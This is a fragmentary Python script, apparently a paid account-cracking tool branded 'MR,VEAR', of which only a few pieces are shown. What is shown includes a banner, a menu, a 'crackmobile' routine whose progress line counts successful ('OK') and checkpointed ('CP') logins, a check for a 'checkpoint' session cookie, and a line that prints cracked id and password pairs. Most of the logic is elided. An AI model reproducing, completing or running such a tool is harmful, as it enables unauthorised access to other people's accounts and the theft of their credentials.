...
def banner():
    ...
    print(f"""\033[1;96m      ######## \033[1;96m##     ## \033[1;92m########
         ...
         ##    \033[1;96m##     ## \033[1;92m##
         ##    \033[1;96m##     ## \033[1;92m##
         ##    \033[1;96m##     ## \033[1;92m######## \x1b[1;41m\x1b[1;97mMR [VEAR] \x1b[1;0m
\033[1;32m==================================================
          Author     : MR,VEAR
          Github     : NOT          
          Version    : \033[1;96mPAID//0.2\x1b[0m\033[1;31m [Updated] \x1b[0m
\033[1;31m==================================================           
\x1b[0;97m\x1b[1;43m         BA XER BEY BO TULE MR,VEAR          \x1b[0m
""")
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
def main():
	...
	print(f'{N}[{asu}✓{N}]{H} Status  {N}: \033[41m\033[1;37m PAID \x1b[0m\x1b[1;97m{N}')
	print(' ')
	print(f'[{H}MENU{N}]=============>')
...
def crackmobile_SHOAIB(idf,pwv,nmf):
	...
	fff = '%'
	sys.stdout.write('\r\x1b[1;90m[%s\x1b[1;33mMR,VEAR\x1b[1;90m]-[\x1b[1;96m%s\x1b[1;90m/\x1b[1;95m%s\x1b[1;90m]-[\x1b[1;92mOK:%s\x1b[1;90m]-[\x1b[1;93mCP:%s\x1b[1;90m]-[\x1b[1;94m%s%s\x1b[1;90m]%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
...
def cek_opsi():
    ...
    'viewport-width': '980',}
			...
			if "checkpoint" in ses.cookies.get_dict().keys():
				...
				print('\r%s++++ %s|%s ----> VEAR       %s'%(x,id,pw,x))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
